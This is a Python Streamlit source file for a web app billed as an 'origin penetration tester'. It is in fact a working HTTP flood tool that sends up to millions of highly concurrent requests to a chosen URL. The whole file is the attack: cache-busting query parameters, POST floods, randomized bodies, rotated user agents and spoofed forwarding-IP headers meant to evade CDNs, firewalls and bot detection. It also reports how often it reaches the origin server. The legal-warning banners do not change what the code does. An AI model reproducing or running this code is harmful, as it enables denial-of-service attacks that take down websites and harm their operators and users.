import asyncio
import time
import httpx
import pandas as pd
import streamlit as st
from datetime import datetime
from collections import deque
import nest_asyncio
import random
import string
import hashlib

nest_asyncio.apply()

# --- PAGE CONFIG ---
st.set_page_config(page_title="🎯 Ultimate Penetration Tester", page_icon="🎯", layout="wide")

# --- CUSTOM CSS ---
st.markdown("""
    <style>
    .main-header {
        text-align: center;
        padding: 2rem 0;
        background: linear-gradient(135deg, #DC143C 0%, #8B0000 100%);
        border-radius: 10px;
        margin-bottom: 2rem;
        color: white;
        box-shadow: 0 4px 15px rgba(220,20,60,0.4);
    }
    .penetration-warning {
        background: linear-gradient(135deg, #FF4500 0%, #FF0000 100%);
        border: 3px solid #8B0000;
        padding: 1.5rem;
        border-radius: 12px;
        color: white;
        margin: 1rem 0;
        font-weight: bold;
        box-shadow: 0 4px 20px rgba(255,0,0,0.3);
    }
    .bypass-indicator {
        background: #1a1a1a;
        border-left: 4px solid #00FF00;
        padding: 1rem;
        margin: 0.5rem 0;
        border-radius: 4px;
        font-family: monospace;
    }
    </style>
""", unsafe_allow_html=True)

# --- TITLE ---
st.markdown("""
    <div class="main-header">
        <h1>🎯 ULTIMATE ORIGIN PENETRATION TESTER</h1>
        <p>Bypass CDN | Evade Firewall | Direct Origin Attack</p>
    </div>
""", unsafe_allow_html=True)

# --- CRITICAL WARNING ---
st.markdown("""
    <div class="penetration-warning">
        ⚠️ EXTREME PENETRATION MODE ⚠️<br><br>
        This tool uses advanced techniques to bypass protections:<br>
        🔥 CDN Bypass | 🛡️ Firewall Evasion | 💥 Origin Direct Hit<br><br>
        <strong>UNAUTHORIZED USE IS A FEDERAL CRIME</strong><br>
        Use ONLY with explicit written permission!
    </div>
""", unsafe_allow_html=True)

# --- SESSION STATE ---
if "stop_event" not in st.session_state:
    st.session_state.stop_event = asyncio.Event()
if "test_history" not in st.session_state:
    st.session_state.test_history = []

# --- PENETRATION TECHNIQUES ---
st.markdown("## 🎯 Penetration Configuration")

st.markdown("### 🔓 Bypass Techniques")
bypass_col1, bypass_col2 = st.columns(2)

with bypass_col1:
    st.markdown("**CDN Bypass Methods:**")
    cache_poison = st.checkbox("🔥 Cache Poisoning (Random Query Params)", value=True,
                               help="Add random parameters to bypass CDN cache")
    timestamp_inject = st.checkbox("⏰ Timestamp Injection", value=True,
                                   help="Add timestamp to force cache miss")
    header_manipulation = st.checkbox("📝 Header Manipulation", value=True,
                                     help="Use headers that bypass cache")
    user_agent_rotation = st.checkbox("🔄 User-Agent Rotation", value=True,
                                     help="Rotate user agents to evade detection")

with bypass_col2:
    st.markdown("**Origin Attack Methods:**")
    use_post = st.checkbox("💣 POST Flood (Never Cached)", value=True,
                          help="POST requests always hit origin")
    random_body = st.checkbox("📦 Randomized Request Body", value=True,
                             help="Unique body per request")
    custom_headers = st.checkbox("🎭 Anti-Detection Headers", value=True,
                                help="Headers to avoid bot detection")
    mixed_methods = st.checkbox("🔀 Mixed HTTP Methods (GET/POST/PUT)", value=False,
                               help="Randomize HTTP methods")

st.markdown("### ⚡ Attack Configuration")

col1, col2, col3 = st.columns(3)
with col1:
    url = st.text_input("🎯 Target URL", placeholder="https://target.com")
with col2:
    req_total = st.number_input("💣 Total Requests", 1, 10000000, 100000, 10000)
with col3:
    concurrency = st.number_input("🚀 Concurrency", 1, 100000, 10000, 1000)

col4, col5, col6 = st.columns(3)
with col4:
    timeout = st.number_input("⏱️ Timeout (s)", 1, 30, 3)
with col5:
    delay_ms = st.number_input("⏰ Delay (ms)", 0, 1000, 0)
with col6:
    update_interval = st.number_input("📊 Update Interval", 100, 50000, 5000)

# Advanced evasion
with st.expander("🕵️ Advanced Evasion Settings"):
    adv_col1, adv_col2, adv_col3 = st.columns(3)
    with adv_col1:
        http2_enabled = st.checkbox("HTTP/2", value=True)
        keep_alive = st.checkbox("Keep-Alive", value=True)
    with adv_col2:
        verify_ssl = st.checkbox("Verify SSL", value=False)
        follow_redirects = st.checkbox("Follow Redirects", value=False)
    with adv_col3:
        connection_pool_size = st.number_input("Connection Pool", 1000, 200000, concurrency * 2)
        keepalive_timeout = st.number_input("Keepalive Timeout (s)", 5, 300, 60)

# --- PENETRATION TECHNIQUES IMPLEMENTATION ---

def generate_cache_buster():
    """Generate random string to bust cache"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def generate_timestamp_param():
    """Generate timestamp parameter"""
    return str(int(time.time() * 1000000))

def get_random_user_agent():
    """Rotate through realistic user agents"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    ]
    return random.choice(user_agents)

def get_anti_detection_headers():
    """Headers to appear as legitimate browser traffic"""
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
    }

def generate_random_body():
    """Generate random JSON body for POST requests"""
    return {
        "id": generate_cache_buster(),
        "timestamp": generate_timestamp_param(),
        "data": hashlib.md5(generate_cache_buster().encode()).hexdigest()
    }

def build_penetration_url(base_url, cache_poison, timestamp_inject):
    """Build URL with cache bypass techniques"""
    url = base_url
    params = []
    
    if cache_poison:
        params.append(f"_cb={generate_cache_buster()}")
    
    if timestamp_inject:
        params.append(f"_ts={generate_timestamp_param()}")
    
    # Additional cache busting
    params.append(f"_r={random.randint(1, 999999999)}")
    
    if params:
        separator = '&' if '?' in url else '?'
        url = f"{url}{separator}{'&'.join(params)}"
    
    return url

# --- ULTRA OPTIMIZED PENETRATION WORKER ---
async def penetration_worker(client, stats, base_url, config, worker_id):
    """Advanced penetration worker with bypass techniques"""
    try:
        if config['delay_ms'] > 0:
            await asyncio.sleep(config['delay_ms'] / 1000)
        
        if st.session_state.stop_event.is_set():
            return
        
        # Build URL with cache bypass
        url = build_penetration_url(
            base_url, 
            config['cache_poison'], 
            config['timestamp_inject']
        )
        
        # Prepare headers
        headers = {}
        if config['user_agent_rotation']:
            headers['User-Agent'] = get_random_user_agent()
        
        if config['header_manipulation']:
            headers.update(get_anti_detection_headers())
        
        if config['custom_headers']:
            # Add headers that often bypass WAF
            headers.update({
                "X-Originating-IP": f"127.0.0.{random.randint(1, 254)}",
                "X-Forwarded-For": f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
                "X-Remote-IP": f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
                "X-Remote-Addr": f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
            })
        
        start = time.perf_counter()
        
        # Determine HTTP method
        if config['mixed_methods']:
            method = random.choice(['GET', 'POST', 'PUT'])
        elif config['use_post']:
            method = 'POST'
        else:
            method = 'GET'
        
        # Execute request
        if method == 'POST':
            body = generate_random_body() if config['random_body'] else {"test": "data"}
            resp = await client.post(url, json=body, headers=headers, timeout=config['timeout'])
        elif method == 'PUT':
            body = generate_random_body() if config['random_body'] else {"test": "data"}
            resp = await client.put(url, json=body, headers=headers, timeout=config['timeout'])
        else:
            resp = await client.get(url, headers=headers, timeout=config['timeout'])
        
        latency = time.perf_counter() - start
        
        # Collect stats
        stats['count'] += 1
        stats['latencies'].append(latency)
        stats['statuses'][resp.status_code] = stats['statuses'].get(resp.status_code, 0) + 1
        stats['bytes'] += len(resp.content)
        
        # Check if we bypassed cache
        cache_status = resp.headers.get('x-cache', resp.headers.get('cf-cache-status', 'UNKNOWN'))
        if cache_status not in ['HIT', 'STALE']:
            stats['cache_bypass'] += 1
        
    except asyncio.TimeoutError:
        stats['errors']['timeout'] += 1
    except httpx.ConnectError:
        stats['errors']['connect'] += 1
    except Exception as e:
        stats['errors']['other'] += 1


async def run_penetration_test(progress, log_area, status_area, url, config):
    """Main penetration test function"""
    
    # Initialize stats
    stats = {
        'count': 0,
        'latencies': deque(maxlen=50000),
        'statuses': {},
        'bytes': 0,
        'cache_bypass': 0,
        'errors': {'timeout': 0, 'connect': 0, 'other': 0}
    }
    
    # Configure ultra-optimized client
    limits = httpx.Limits(
        max_connections=config['pool_size'],
        max_keepalive_connections=config['pool_size'] if config['keep_alive'] else 0,
        keepalive_expiry=config['keepalive_timeout'] if config['keep_alive'] else 0
    )
    
    timeout_config = httpx.Timeout(
        config['timeout'],
        connect=min(2.0, config['timeout'] / 2),
        pool=1.0
    )
    
    async with httpx.AsyncClient(
        http2=config['http2'],
        limits=limits,
        timeout=timeout_config,
        follow_redirects=config['follow_redirects'],
        verify=config['verify_ssl']
    ) as client:
        
        # Create all tasks
        tasks = [
            penetration_worker(client, stats, url, config, i)
            for i in range(config['req_total'])
        ]
        
        start_time = time.time()
        done = 0
        
        # Process tasks
        for coro in asyncio.as_completed(tasks):
            if st.session_state.stop_event.is_set():
                break
            
            await coro
            done += 1
            
            if done % config['update_interval'] == 0 or done == config['req_total']:
                progress.progress(min(done / config['req_total'], 1.0))
                elapsed = time.time() - start_time
                rps = done / elapsed if elapsed > 0 else 0
                
                total_errors = sum(stats['errors'].values())
                success_rate = ((done - total_errors) / done * 100) if done > 0 else 0
                bypass_rate = (stats['cache_bypass'] / done * 100) if done > 0 else 0
                
                log_area.markdown(f"""
                    **Progress:** {done:,}/{config['req_total']:,} ({done/config['req_total']*100:.1f}%)  
                    **Speed:** {rps:,.0f} RPS  
                    **Success:** {success_rate:.1f}%  
                    **Cache Bypass:** {bypass_rate:.1f}% 🔥  
                    **Errors:** {total_errors:,}
                """)
                
                # Live latency
                if stats['latencies']:
                    recent = list(stats['latencies'])[-100:]
                    avg = sum(recent) / len(recent)
                    status_area.metric(
                        "Avg Latency (Last 100)",
                        f"{avg*1000:.0f}ms",
                        delta=f"{rps:,.0f} RPS"
                    )
    
    return stats, time.time() - start_time


# --- UI BUTTONS ---
st.markdown("---")
btn_col1, btn_col2, btn_col3 = st.columns([2, 2, 1])
with btn_col1:
    start_btn = st.button("🎯 INITIATE PENETRATION", use_container_width=True, type="primary")
with btn_col2:
    stop_btn = st.button("🛑 ABORT MISSION", use_container_width=True)
with btn_col3:
    if st.button("🗑️ Clear", use_container_width=True):
        st.session_state.test_history = []
        st.rerun()

if stop_btn:
    st.session_state.stop_event.set()
    st.error("⚠️ MISSION ABORTED!", icon="🛑")

# --- RUN PENETRATION TEST ---
if start_btn:
    if not url or not url.startswith(("http://", "https://")):
        st.error("❌ Invalid URL")
        st.stop()
    
# Final confirmation
    st.error(f"🎯 INITIATING PENETRATION: {req_total:,} requests × {concurrency:,} concurrent")
    
    # Show active techniques
    st.markdown("### 🔓 Active Bypass Techniques:")
    techniques = []
    if cache_poison: techniques.append("🔥 Cache Poisoning")
    if timestamp_inject: techniques.append("⏰ Timestamp Injection")
    if header_manipulation: techniques.append("📝 Header Manipulation")
    if user_agent_rotation: techniques.append("🔄 User-Agent Rotation")
    if use_post: techniques.append("💣 POST Flood")
    if random_body: techniques.append("📦 Random Body")
    if custom_headers: techniques.append("🎭 Anti-Detection Headers")
    if mixed_methods: techniques.append("🔀 Mixed Methods")
    
    st.markdown(f"<div class='bypass-indicator'>{' | '.join(techniques)}</div>", unsafe_allow_html=True)
    
    st.markdown("---")
    st.subheader("🎯 PENETRATION IN PROGRESS...")
    
    progress = st.progress(0)
    log_area = st.empty()
    status_area = st.empty()
    
    # Prepare config
    config = {
        'req_total': req_total,
        'concurrency': concurrency,
        'timeout': timeout,
        'delay_ms': delay_ms,
        'update_interval': update_interval,
        'cache_poison': cache_poison,
        'timestamp_inject': timestamp_inject,
        'header_manipulation': header_manipulation,
        'user_agent_rotation': user_agent_rotation,
        'use_post': use_post,
        'random_body': random_body,
        'custom_headers': custom_headers,
        'mixed_methods': mixed_methods,
        'http2': http2_enabled,
        'keep_alive': keep_alive,
        'verify_ssl': verify_ssl,
        'follow_redirects': follow_redirects,
        'pool_size': connection_pool_size,
        'keepalive_timeout': keepalive_timeout
    }
    
    # Run test
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        stats, duration = loop.run_until_complete(
            run_penetration_test(progress, log_area, status_area, url, config)
        )
        loop.close()
    except Exception as e:
        st.error(f"💥 Penetration failed: {str(e)}")
        st.stop()
    
    # Results
    total_requests = stats['count']
    total_errors = sum(stats['errors'].values())
    success_count = total_requests - total_errors
    success_rate = (success_count / total_requests * 100) if total_requests > 0 else 0
    bypass_rate = (stats['cache_bypass'] / total_requests * 100) if total_requests > 0 else 0
    
    latencies = list(stats['latencies'])
    throughput = total_requests / duration if duration > 0 else 0
    total_mb = stats['bytes'] / (1024 * 1024)
    
    # Save history
    st.session_state.test_history.append({
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "url": url,
        "requests": total_requests,
        "throughput": f"{throughput:.0f}",
        "bypass_rate": f"{bypass_rate:.1f}%",
        "success": f"{success_rate:.1f}%"
    })
    
    st.markdown("---")
    st.success("✅ PENETRATION COMPLETE!")
    
    # Main metrics
    st.markdown("## 🎯 Penetration Results")
    m1, m2, m3, m4, m5 = st.columns(5)
    m1.metric("⚡ Throughput", f"{throughput:,.0f} RPS")
    m2.metric("⏱️ Duration", f"{duration:.2f}s")
    m3.metric("✅ Success", f"{success_rate:.1f}%")
    m4.metric("🔥 Cache Bypass", f"{bypass_rate:.1f}%")
    m5.metric("❌ Errors", total_errors)
    
    # Bypass indicator
    if bypass_rate > 80:
        st.success(f"🔥 EXCELLENT BYPASS RATE: {bypass_rate:.1f}% - Origin server directly hit!")
    elif bypass_rate > 50:
        st.warning(f"⚠️ MODERATE BYPASS: {bypass_rate:.1f}% - Some requests still cached")
    else:
        st.error(f"❌ LOW BYPASS: {bypass_rate:.1f}% - CDN still blocking most requests")
    
    # Latency stats
    if latencies:
        st.markdown("### ⏱️ Latency Metrics")
        df_lat = pd.DataFrame(latencies, columns=['latency'])
        l1, l2, l3, l4, l5 = st.columns(5)
        l1.metric("Min", f"{min(latencies)*1000:.0f}ms")
        l2.metric("Median", f"{df_lat['latency'].quantile(0.5)*1000:.0f}ms")
        l3.metric("P95", f"{df_lat['latency'].quantile(0.95)*1000:.0f}ms")
        l4.metric("P99", f"{df_lat['latency'].quantile(0.99)*1000:.0f}ms")
        l5.metric("Max", f"{max(latencies)*1000:.0f}ms")
        
        st.line_chart(df_lat['latency']*1000)
    
    # Status codes
    if stats['statuses']:
        st.markdown("### 📊 Response Codes")
        st.bar_chart(pd.Series(stats['statuses']))
    
    # Error breakdown
    if total_errors > 0:
        st.markdown("### ❌ Error Analysis")
        e1, e2, e3 = st.columns(3)
        e1.metric("Timeouts", stats['errors']['timeout'])
        e2.metric("Connection", stats['errors']['connect'])
        e3.metric("Other", stats['errors']['other'])

# History
if st.session_state.test_history:
    st.markdown("---")
    st.subheader("📜 Penetration History")
    st.dataframe(pd.DataFrame(st.session_state.test_history), use_container_width=True)

# Footer
st.markdown("---")
st.error("""
    ⚠️ **LEGAL WARNING**: Unauthorized penetration testing is ILLEGAL.  
    This tool is for AUTHORIZED TESTING ONLY. Violators will be prosecuted.  
    Indonesia: UU ITE Pasal 30-32 | USA: CFAA | EU: GDPR Article 82
""")
